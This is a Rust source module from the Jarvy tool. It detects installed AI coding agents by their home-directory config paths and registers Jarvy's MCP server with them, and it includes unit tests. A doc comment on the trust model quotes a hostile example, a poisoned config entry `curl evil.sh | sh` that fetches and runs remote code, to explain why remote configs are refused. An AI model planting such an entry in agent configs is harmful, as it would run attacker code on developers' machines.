//! MCP server registration with AI coding agents.
//!
//! Jarvy already ships a Model Context Protocol server (`jarvy mcp`,
//! defined in `src/mcp/`). This module's job is the discovery problem:
//! a terminal AI agent (Claude Code, Cursor, Codex CLI, ...) won't
//! invoke that server unless it knows about it. Manual registration
//! every developer per machine doesn't scale.
//!
//! Mirrors the `src/ai_hooks/` architecture:
//!
//! - [`config`]      — `[mcp_register]` schema for `jarvy.toml`.
//! - [`error`]       — `McpRegisterError`.
//! - [`runner`]      — `apply` / `check` / `remove` orchestration.
//! - [`registrars`]  — `AgentRegistrar` trait + per-agent implementations.
//!
//! Each registrar writes the agent's native MCP-config file (e.g.
//! `~/.cursor/mcp.json`, `~/.codex/config.toml`) declaring `jarvy` as
//! an MCP server invokable over stdio. Re-running is idempotent thanks
//! to the same `_jarvy_managed` marker the AI hooks subsystem uses.
//!
//! # Trust model
//!
//! Identical to AI hooks: a `ConfigOrigin::Remote` config (fetched via
//! `jarvy setup --from <url>`) cannot register **custom** MCP servers
//! beyond the built-in Jarvy server. A poisoned team config cannot
//! sneak a `command = "curl evil.sh | sh"` MCP server entry into every
//! developer's `~/.claude.json` — the runner refuses outright.

pub mod config;
pub mod error;
pub mod registrars;
pub mod runner;

#[allow(unused_imports)]
pub use config::{
    McpAgentTarget, McpRegisterConfig, McpRegistrationScope, McpServerSpec, McpServerTransport,
};
#[allow(unused_imports)]
pub use error::McpRegisterError;
#[allow(unused_imports)]
pub use runner::{ApplyReport, RemoveReport, apply, check, remove};

/// Detect which AI agents the user has already installed by checking
/// for their config artifacts on disk. Existence-only — this function
/// MUST NOT create or modify any of these paths. Used by the default-on
/// auto-registration flow in `jarvy setup` so we only target agents the
/// user actually has, never an empty `~/.cursor/mcp.json` for a Cursor
/// install they don't have.
///
/// Detection paths (relative to `dirs::home_dir()`):
///
/// | Agent       | Path                                  | Notes |
/// |-------------|---------------------------------------|-------|
/// | claude-code | `.claude.json` OR `.claude/`          | Either form indicates a Claude Code install. |
/// | cursor      | `.cursor/`                            | Cursor IDE creates this on first launch. |
/// | codex       | `.codex/`                             | Codex CLI creates this on first auth. |
/// | windsurf    | `.codeium/windsurf/`                  | Windsurf's vendor namespace. |
/// | continue    | `.continue/`                          | Continue.dev creates this on first project. |
///
/// **Cline is intentionally excluded** from auto-detect. Cline lives in
/// VS Code's `globalStorage` directory whose path varies per OS, per VS
/// Code variant (Stable / Insiders / Code-OSS), and per Cursor
/// (forked-VS-Code-with-its-own-globalStorage). A robust presence check
/// would touch four+ candidate paths and still false-positive on users
/// who installed VS Code but never installed Cline. Project-config
/// opt-in (`[mcp_register] agents = ["cline"]`) remains the explicit
/// path for Cline users.
///
/// Returns an empty Vec when `dirs::home_dir()` is unresolvable
/// (containers running as `nobody`, broken `$HOME`) — the caller treats
/// that as "no agents detected" and the no-op runs cleanly.
pub fn auto_detect_agents() -> Vec<McpAgentTarget> {
    let Some(home) = dirs::home_dir() else {
        return Vec::new();
    };
    let mut found = Vec::new();
    if home.join(".claude.json").exists() || home.join(".claude").is_dir() {
        found.push(McpAgentTarget::ClaudeCode);
    }
    if home.join(".cursor").is_dir() {
        found.push(McpAgentTarget::Cursor);
    }
    if home.join(".codex").is_dir() {
        found.push(McpAgentTarget::Codex);
    }
    if home.join(".codeium").join("windsurf").is_dir() {
        found.push(McpAgentTarget::Windsurf);
    }
    if home.join(".continue").is_dir() {
        found.push(McpAgentTarget::Continue);
    }
    found
}

/// Synthesize the default-on `McpRegisterConfig` used when a project's
/// `jarvy.toml` has no `[mcp_register]` block but the user has at least
/// one AI agent installed. Mirrors `TelemetryConfig::default()`'s
/// opt-out posture: jarvy auto-registers itself with detected agents
/// at user scope, refusing custom servers (library-style).
///
/// `agents` must come from [`auto_detect_agents`] — never from a
/// remote-origin config — so the synthesized result inherits a
/// `ConfigOrigin::Local` posture by default.
pub fn synthesize_auto_register(agents: Vec<McpAgentTarget>) -> McpRegisterConfig {
    McpRegisterConfig {
        agents,
        scope: McpRegistrationScope::User,
        allow_custom_servers: false,
        jarvy: None,
        servers: Vec::new(),
        library_sources: Vec::new(),
        origin: crate::ai_hooks::ConfigOrigin::Local,
    }
}

#[cfg(test)]
mod auto_detect_tests {
    use super::*;
    use std::sync::Mutex;

    static HOME_MUTEX: Mutex<()> = Mutex::new(());

    /// Override `$HOME` (and `USERPROFILE` on Windows) for the duration
    /// of the closure so detection looks at a controlled tempdir, then
    /// restore — the unit tests would otherwise be impossible without
    /// globally trashing the developer's real home.
    ///
    /// `dirs::home_dir()` reads `USERPROFILE` on Windows, not `HOME`;
    /// overriding only `HOME` leaves detection pointed at the runner's
    /// real user profile and every positive-detection assertion fails.
    fn with_fake_home<F: FnOnce(&std::path::Path)>(f: F) {
        let _guard = HOME_MUTEX.lock().unwrap_or_else(|p| p.into_inner());
        let tmp = tempfile::TempDir::new().expect("tempdir");
        let prev_home = std::env::var("HOME").ok();
        let prev_userprofile = std::env::var("USERPROFILE").ok();
        #[allow(unsafe_code)]
        unsafe {
            std::env::set_var("HOME", tmp.path());
            std::env::set_var("USERPROFILE", tmp.path());
        }
        f(tmp.path());
        #[allow(unsafe_code)]
        unsafe {
            match prev_home {
                Some(v) => std::env::set_var("HOME", v),
                None => std::env::remove_var("HOME"),
            }
            match prev_userprofile {
                Some(v) => std::env::set_var("USERPROFILE", v),
                None => std::env::remove_var("USERPROFILE"),
            }
        }
    }

    #[test]
    fn detects_no_agents_in_empty_home() {
        with_fake_home(|_| {
            let found = auto_detect_agents();
            assert!(
                found.is_empty(),
                "empty home must yield no detected agents, got {found:?}"
            );
        });
    }

    #[test]
    fn detects_claude_code_via_dotfile() {
        with_fake_home(|home| {
            std::fs::write(home.join(".claude.json"), "{}").unwrap();
            let found = auto_detect_agents();
            assert_eq!(found, vec![McpAgentTarget::ClaudeCode]);
        });
    }

    #[test]
    fn detects_claude_code_via_directory() {
        with_fake_home(|home| {
            std::fs::create_dir(home.join(".claude")).unwrap();
            let found = auto_detect_agents();
            assert_eq!(found, vec![McpAgentTarget::ClaudeCode]);
        });
    }

    #[test]
    fn detects_multiple_agents() {
        with_fake_home(|home| {
            std::fs::create_dir(home.join(".cursor")).unwrap();
            std::fs::create_dir(home.join(".codex")).unwrap();
            std::fs::create_dir_all(home.join(".codeium").join("windsurf")).unwrap();
            std::fs::create_dir(home.join(".continue")).unwrap();
            let found = auto_detect_agents();
            assert_eq!(
                found,
                vec![
                    McpAgentTarget::Cursor,
                    McpAgentTarget::Codex,
                    McpAgentTarget::Windsurf,
                    McpAgentTarget::Continue,
                ]
            );
        });
    }

    #[test]
    fn ignores_cline_even_when_vs_code_globalstorage_present() {
        // Cline detection is intentionally NOT in auto_detect_agents
        // — VS Code's globalStorage path is too platform-specific and
        // too easy to false-positive (VS Code without Cline).
        // Verified by creating a path that LOOKS like it could be a
        // Cline target and asserting it does not promote Cline.
        with_fake_home(|home| {
            let bogus = home
                .join("Library")
                .join("Application Support")
                .join("Code")
                .join("User")
                .join("globalStorage");
            std::fs::create_dir_all(&bogus).unwrap();
            let found = auto_detect_agents();
            assert!(
                !found.contains(&McpAgentTarget::Cline),
                "auto-detect must not return Cline; got {found:?}"
            );
        });
    }

    #[test]
    fn synthesize_auto_register_carries_local_origin_and_user_scope() {
        let cfg = synthesize_auto_register(vec![McpAgentTarget::ClaudeCode]);
        assert_eq!(cfg.scope, McpRegistrationScope::User);
        assert!(!cfg.allow_custom_servers);
        assert!(cfg.servers.is_empty());
        assert!(cfg.jarvy.is_none());
        // Local origin is what passes the trust gate in
        // `crate::mcp_register::runner::resolve`. Without this, custom
        // servers (which we don't ship anyway, but defense in depth)
        // would be silently refused as remote.
        assert!(matches!(cfg.origin, crate::ai_hooks::ConfigOrigin::Local));
    }
}
